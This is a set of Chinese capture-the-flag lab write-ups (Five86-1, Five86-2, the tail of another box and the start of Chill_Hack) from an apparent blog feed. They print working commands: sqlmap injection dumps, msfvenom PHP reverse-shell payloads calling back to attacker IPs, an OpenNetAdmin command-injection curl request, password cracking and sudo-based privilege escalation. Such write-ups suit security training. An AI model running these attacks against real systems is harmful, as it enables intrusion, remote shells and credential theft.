src="https://img.rruu.net/image/5feaa86409c6d" alt="image-20201225123411576"></p><p>查找数据表</p><p><img src="https://img.rruu.net/image/5feaa869cfdcd" alt="image-20201225123451770"></p><p>直接dump user表所有数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --tamper&#x3D;space2comment.py  --prefix&#x3D;&quot;%&#39;&quot; --suffix&#x3D;&quot;%23&quot; -p search -D &quot;webapphacking&quot; -T &quot;users&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa86e1e138" alt="image-20201225123606588"></p><p>将superadmin解密 Uncrackable，使用superadmin登录。</p><p><img src="https://img.rruu.net/image/5feaa87358e0b" alt="image-20201225123732560"></p><h3 id="代码执行挖掘与绕过"><a href="#代码执行挖掘与绕过" class="headerlink" title="代码执行挖掘与绕过"></a>代码执行挖掘与绕过</h3><p>上传文件无法突破，采用的是很严格。故采取挖掘其他地方。</p><p><img src="https://img.rruu.net/image/5feaa87853d0c" alt="image-20201228122705032"></p><p>msf生成phpshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.132.140 lport&#x3D;9000 -f raw &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa87d3da4b" alt="image-20201228122745360"></p><p>将phpshell base64加密，他这里会把这个lname过滤，我们使用这个fname的参数绕过过滤。将php shell写入linux。</p><p><img src="https://img.rruu.net/image/5feaa881be22b" alt="image-20201228123143150"></p><p>写入成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa886ee867" alt="image-20201228123235670"></p><p>msf设置会话监听</p><p><img src="https://img.rruu.net/image/5feaa88ccd264" alt="image-20201228123352237"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa89286e96" alt="image-20201228124523839"></p><h3 id="二进制文件-suid提权"><a href="#二进制文件-suid提权" class="headerlink" title="二进制文件 suid提权"></a>二进制文件 suid提权</h3><p>查找suid权限文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>发现异常文件</p><p><img src="https://img.rruu.net/image/5feaa8978328e" alt="image-20201228124601838"></p><p>直接运行，获取root权限，这没有一点难度。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;legacy&#x2F;touchmenot</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa89c07f3d" alt="image-20201228124624224"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Five86-2</title>
      <link href="2020/12/29/Five86-2/"/>
      <url>2020/12/29/Five86-2/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.126</p><p>修改一下hosts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa7e493efa" alt="image-20201227173553346"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA five86-2 192.168.56.126</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa7ea31e0f" alt="image-20201227155746174"></p><p>开放20 21 80</p><p>20 21 ftp</p><p>80 web</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.126</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa7f09b846" alt="image-20201227155912778"></p><h3 id="whatweb识别cms"><a href="#whatweb识别cms" class="headerlink" title="whatweb识别cms"></a>whatweb识别cms</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:&#x2F;&#x2F;192.168.56.126</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa7f5d5c9d" alt="image-20201227172333409"></p><h3 id="gobuster扫描目录"><a href="#gobuster扫描目录" class="headerlink" title="gobuster扫描目录"></a>gobuster扫描目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 50 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.126 -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa7fb6ddf0" alt="image-20201227172430195"></p><p>有效信息：wp-admin 后台</p><h3 id="wpscan检测web站点"><a href="#wpscan检测web站点" class="headerlink" title="wpscan检测web站点"></a>wpscan检测web站点</h3><p>wpscan枚举用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.126 -e</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa8011ca57" alt="image-20201227172626619"></p><p>wpscan暴力破解用户名，这里我尝试破解了admin，但是破解了很久也没有破解出来，于是放弃，试了其他用户也都破解不出来。barney和stephen一会就破解出来了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.126 --usernames barney -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.56.126 --usernames stephen -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa80738967" alt="image-20201227173213091"></p><p><img src="https://img.rruu.net/image/5feaa80d46807" alt="image-20201227183213795"></p><h3 id="wordpress后台getshell"><a href="#wordpress后台getshell" class="headerlink" title="wordpress后台getshell"></a>wordpress后台getshell</h3><h4 id="searchsploit搜索漏洞"><a href="#searchsploit搜索漏洞" class="headerlink" title="searchsploit搜索漏洞"></a>searchsploit搜索漏洞</h4><p>查看后台，未发现能使用常规的wpgetshell方法。我们使用插件getshell，首先查看有什么插件。需要学习常规wordpress后台获取shell的方法请查看这里：<a href="https://www.hacknos.com/wordpress-shell-upload/">https://www.hacknos.com/wordpress-shell-upload/</a></p><p><img src="https://img.rruu.net/image/5feaa8133fb6e" alt="image-20201227175404908"></p><p>搜索相关插件，其中搜索第一个的时候是不可以利用的。具体原因，自己查看php文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Insert or</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa818344c1" alt="image-20201227175326007"></p><p>这里我们找到一个远程代码执行的漏洞</p><p><img src="https://img.rruu.net/image/5feaa81ef3ee9" alt="image-20201227180156547"></p><p>我们调用出来，查看一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php&#x2F;webapps&#x2F;46981.txt -m</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa8245cdaf" alt="image-20201227180236104"></p><p>查看使用说明，大概意思是说创建压缩包，里面放一个shell.php 然后找到创建一个文章，然后上传zip。这里给了一个视频地址，有兴趣的自己去看一下。 <a href="https://youtu.be/knst26fEGCw?t=44">https://youtu.be/knst26fEGCw?t=44</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 46981.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa82918f76" alt="image-20201227180308478"></p><h4 id="利用插件getshell"><a href="#利用插件getshell" class="headerlink" title="利用插件getshell"></a>利用插件getshell</h4><p>msf生成shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa82ecb2dd" alt="image-20201227180741335"></p><p>创建压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip magisec.zip index.html shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa83376cc4" alt="image-20201227180757086"></p><p>新建一个文章，点击e-learning</p><p><img src="https://img.rruu.net/image/5feaa8387e337" alt="image-20201227181009002"></p><p>选择upload</p><p><img src="https://img.rruu.net/image/5feaa83d47ce4" alt="image-20201227181030129"></p><p>点击上传，然后选择iframe框架</p><p><img src="https://img.rruu.net/image/5feaa8418f800" alt="image-20201227181119258"></p><p>返回一串地址</p><p><img src="https://img.rruu.net/image/5feaa8465098a" alt="image-20201227181144122"></p><p>配置msf监听会话</p><p><img src="https://img.rruu.net/image/5feaa84ad880c" alt="image-20201227181209780"></p><p>访问地址，即可反弹shell回来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;five86-2&#x2F;wp-content&#x2F;uploads&#x2F;articulate_uploads&#x2F;magisec&#x2F;shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa84fe62b1" alt="image-20201227181317744"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><p>收集用户密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa85488fe3" alt="image-20201227181435057"></p><h3 id="python3切换bash"><a href="#python3切换bash" class="headerlink" title="python3切换bash"></a>python3切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa859e2782" alt="image-20201227181618686"></p><p>su切换用户，尝试了barney，失败了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa85e8c1cd" alt="image-20201227183019614"></p><h4 id="使用tcpdump检查密码"><a href="#使用tcpdump检查密码" class="headerlink" title="使用tcpdump检查密码"></a>使用tcpdump检查密码</h4><p>id为pcap，我们检查一下网卡。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip add</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa86389948" alt="image-20201227184312305"></p><p>使用tcpdump监听，这里我没有截图。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i veth8616dc6 -w node.pcap</span><br></pre></td></tr></table></figure><p>使用tcpdump查看node.pcap。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r node.pcap</span><br></pre></td></tr></table></figure><p>发现敏感信息</p><p><img src="https://img.rruu.net/image/5feaa8691ffac" alt="image-20201227184502215"></p><p>su切换用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa86ea4cba" alt="image-20201227184610654"></p><h4 id="service切换peter-bash"><a href="#service切换peter-bash" class="headerlink" title="service切换peter bash"></a>service切换peter bash</h4><p>查看sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa872d02ef" alt="image-20201227184650652"></p><p>发现可以切换到peter用户，我们使用service切换shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u peter service ..&#x2F;..&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa877a1470" alt="image-20201227184954048"></p><p>查看peter用户的sudo配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa87d4ff40" alt="image-20201227185108526"></p><h4 id="sudo权限passwd提权"><a href="#sudo权限passwd提权" class="headerlink" title="sudo权限passwd提权"></a>sudo权限passwd提权</h4><p>使用passwd重置root密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa881e58aa" alt="image-20201227185137596"></p><p>切换root用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa88621659" alt="image-20201227185202443"></p><h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;thisistheflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5feaa88a88415" alt="image-20201227185253742"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Five86-1</title>
      <link href="2020/12/28/Five86-1/"/>
      <url>2020/12/28/Five86-1/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.125</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oA five86-1 192.168.56.125</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe932fae163c" alt="image-20201226232908642"></p><p>开放22 80 10000</p><p>22 ssh</p><p>80 web</p><p>10000 webmin</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>fiefox打开web站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.125</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933061c783" alt="image-20201226233232778"></p><p>打开是一个空白页面，没有任何信息</p><h3 id="gobuster爆破目录"><a href="#gobuster爆破目录" class="headerlink" title="gobuster爆破目录"></a>gobuster爆破目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 50 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.125 -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9330b0d9c4" alt="image-20201226233345909"></p><p>这里都看了一遍，有用的就是robots.txt。</p><p><img src="https://img.rruu.net/image/5fe93312c1869" alt="image-20201226233446534"></p><p>这里有一个ona目录，访问一下。发现一个web程序。</p><p><img src="https://img.rruu.net/image/5fe93317c1f46" alt="image-20201226233523456"></p><p>gobuster爆破一下ona目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 50 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.125&#x2F;ona -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933289ed94" alt="image-20201226234218203"></p><p>没有发现有价值的信息</p><h3 id="whatweb识别cms"><a href="#whatweb识别cms" class="headerlink" title="whatweb识别cms"></a>whatweb识别cms</h3><p>使用whatweb识别cms</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http:&#x2F;&#x2F;192.168.56.125&#x2F;ona</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe93336103b3" alt="image-20201226233632056"></p><p>初步判断使用OpenNetAdmin，访问主页得到版本。</p><p><img src="https://img.rruu.net/image/5fe933426afbc" alt="image-20201226234303199"></p><h3 id="检测OpenNetAdmin漏洞"><a href="#检测OpenNetAdmin漏洞" class="headerlink" title="检测OpenNetAdmin漏洞"></a>检测OpenNetAdmin漏洞</h3><p>我们使用kali的exploit-db搜索漏洞，第一个是msf的，第二个是一个linux利用的脚本。我们选择第二个。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit OpenNetAdmin</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe93349b1988" alt="image-20201226233807849"></p><p>使用searchsploit获取脚本到当前目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit php&#x2F;webapps&#x2F;47691.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9335294c94" alt="image-20201226234412917"></p><p>直接运行脚本有问题</p><p><img src="https://img.rruu.net/image/5fe9335b1f6ef" alt="image-20201226234648133"></p><p>这个脚本写的有问题，我们直接看一下怎么利用的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 47691.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933607b62d" alt="image-20201226234754852"></p><p>直接复制curl请求的一串，把url和cmd分别换成目标url和要执行的命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --silent -d &quot;xajax&#x3D;window_submit&amp;xajaxr&#x3D;1574117726710&amp;xajaxargs[]&#x3D;tooltips&amp;xajaxargs[]&#x3D;ip%3D%3E;echo \&quot;BEGIN\&quot;;id;echo \&quot;END\&quot;&amp;xajaxargs[]&#x3D;ping&quot; &quot;http:&#x2F;&#x2F;192.168.56.125&#x2F;ona&#x2F;login.php&quot; | sed -n -e &#39;&#x2F;BEGIN&#x2F;,&#x2F;END&#x2F; p&#39; | tail -n +2 | head -n -1</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe93367121ea" alt="image-20201226234858334"></p><h3 id="命令执行反弹shell"><a href="#命令执行反弹shell" class="headerlink" title="命令执行反弹shell"></a>命令执行反弹shell</h3><p>msf生成phpshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9336d210b6" alt="image-20201227003908604"></p><p>python开启http服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9337e7ae5b" alt="image-20201227003919402"></p><p>burpsuite执行wget下载到/tmp目录</p><p><img src="https://img.rruu.net/image/5fe933898cc3a" alt="image-20201227003831969"></p><p>使用php执行shell.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php &#x2F;tmp&#x2F;shell.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe93394f11b9" alt="image-20201227003851882"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="python切换bash"><a href="#python切换bash" class="headerlink" title="python切换bash"></a>python切换bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9339b49d63" alt="image-20201227010552821"></p><h3 id="发现htpasswd文件"><a href="#发现htpasswd文件" class="headerlink" title="发现htpasswd文件"></a>发现htpasswd文件</h3><p>收集主机信息，在/var/www目录下发现htpass文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .&#x2F;.htpasswd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933a078ae2" alt="image-20201227004320153"></p><p>将密码保存到hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1&#39; &gt; hash</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933a730a9b" alt="image-20201227005003069"></p><h3 id="crunch生成字典"><a href="#crunch生成字典" class="headerlink" title="crunch生成字典"></a>crunch生成字典</h3><p>根据提示，我们需要生成10位数的密码，我们使用crunch生成密码字典。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; dict.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933ae01cf4" alt="image-20201227004911471"></p><h3 id="使用john爆破密码"><a href="#使用john爆破密码" class="headerlink" title="使用john爆破密码"></a>使用john爆破密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;.&#x2F;dict.txt hash</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933b9bb6fa" alt="image-20201227005014066"></p><p>回到msf，su切换用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su douglas</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933bea2af1" alt="image-20201227010617479"></p><h3 id="ssh-key登录jen用户"><a href="#ssh-key登录jen用户" class="headerlink" title="ssh-key登录jen用户"></a>ssh-key登录jen用户</h3><p>查看sudo配置，发现jen的cp可以不需要密码，我们使用cp命令复制公钥到jen目录，使用sshkey登录到jen。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933c8a00c7" alt="image-20201227010702024"></p><p>kali生成sshkey</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933cf78f47" alt="image-20201227010919693"></p><p>上传至目标</p><p><img src="https://img.rruu.net/image/5fe933d45cbbe" alt="image-20201227010955100"></p><p>使用sudo复制key到jen的home目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jen cp authorized_keys &#x2F;home&#x2F;jen&#x2F;.ssh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933dbbd989" alt="image-20201227011056162"></p><p>切回kali使用ssh登录。发现ssh有一个提示，you have new mail，意思是我们有一封新的邮件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jen@192.168.56.125 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933e3dd964" alt="image-20201227011151786"></p><p>来到mail目录阅读文件，发现账户名和密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;mail&#x2F;jen</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933ea65e98" alt="image-20201227011614566"></p><p>使用su切换moss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su moss</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933f0838d7" alt="image-20201227011718906"></p><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>搜索具有suid权限的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933f74bf3d" alt="image-20201227011837676"></p><p>发现在home目录下有一个upyourgame文件，我们去查一下一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upyourgame</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe933ff1f51e" alt="image-20201227012019483"></p><p>获取flag文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe9340538ee1" alt="image-20201227012104651"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Chill_Hack</title>
      <link href="2020/12/28/Chill-Hack/"/>
      <url>2020/12/28/Chill-Hack/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.132.138</p><p>靶机IP：192.168.132.135</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描分析"><a href="#nmap扫描分析" class="headerlink" title="nmap扫描分析"></a>nmap扫描分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- 192.168.132.135 -oN Chill_Hack.nmap</span><br></pre></td></tr></table></figure><p>端口开放21 22 80</p><p>21支持匿名访问</p><p>22 ssh</p><p>80 web</p><p><img src="https://img.rruu.net/image/5fe9281593944" alt="image-20201221102607737"></p><h2 id="21端口渗透"><a href="#21端口渗透" class="headerlink" title="21端口渗透"></a>21端口渗透</h2><p>通过匿名用户访问ftp，下载并查看note.txt</p><p><img src="https://img.rruu.net/image/5fe9281b1589b" alt="image-20201221102958155"></p><p>这里他说把这个命令执行进行了过滤，那么我们等会挖掘漏洞的方向就是命令执行。</p><p><img src="https://img.rruu.net/image/5fe928213d3c6" alt="image-20201221103231930"></p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>访问80端口 firefox <a href="http://192.168.132.135/">http://192.168.132.135</a></p><p><img src="https://img.rruu.net/image/5fe92826c814a" alt="image-20201221103357211"></p><p>右键源代码查看网站url</p><p><img src="https://img.rruu.net/image/5fe9282ed2d53" alt="image-20201221103425669"></p><p>并未发现任何有价值的目录</p><h3 id="gobuster扫描目录"><a href="#gobuster扫描目录" class="headerlink" title="gobuster扫描目录"></a>gobuster扫描目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir 